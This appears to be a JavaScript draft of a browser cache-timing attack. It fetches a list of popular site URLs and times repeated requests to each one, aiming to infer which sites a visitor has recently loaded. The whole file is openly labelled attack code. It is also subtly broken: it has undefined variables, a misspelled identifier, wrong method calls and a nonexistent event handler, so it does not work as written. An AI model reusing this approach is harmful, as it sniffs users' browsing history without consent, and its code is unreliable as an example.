function ajaxRequest(){
 var activexmodes=["Msxml2.XMLHTTP", "Microsoft.XMLHTTP"] //activeX versions to check for in IE
 if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
  for (var i=0; i<activexmodes.length; i++){
   try{
    return new ActiveXObject(activexmodes[i])
   }
   catch(e){
    //suppress error
   }
  }
 }
 else if (window.XMLHttpRequest) // if Mozilla, Safari etc
  return new XMLHttpRequest()
 else
  return false
}

/*parser*/

url_loader = function(text_url){
	var url_list = new Array();
	var raw_list = new ajaxRequest();
	raw_list.open("GET", text_url, false);
	raw_list.send(null);
	var split_list = raw_list.split(',');
	for (var index in split_list){
		url_list.push(split_list[index]);
	}
}


/*timing attack*/

document.onReady = function(){
	var loader = url_loader("top500.txt");
	var blind_run = new array();
	var cache_run = new array();
	for (var index in loader.url_list){
		var run_request = new ajaxRequest();
		var start_time = new Date(milliseconds);
		run_request.open("GET", loader.url_list[index], false);
		run_request.send(null);
		var end_time = new Date(millisecondds);
		var difference = end_time - start_time;
		blind_run.push(difference);
	}
	for (var index in loader.url_list){
		var run_request = new ajaxRequest();
		var start_time = new Date(milliseconds);
		run_request.open("GET", loader.url_list[index], false);
		run_request.send(null);
		var end_time = new Date(millisecondds);
		var difference = end_time - start_time;
		cache_run.push(difference);
	}
	for (var index in blind_run){
		document.writeln(blind_run[index]-cache_run[index]);
	}
}
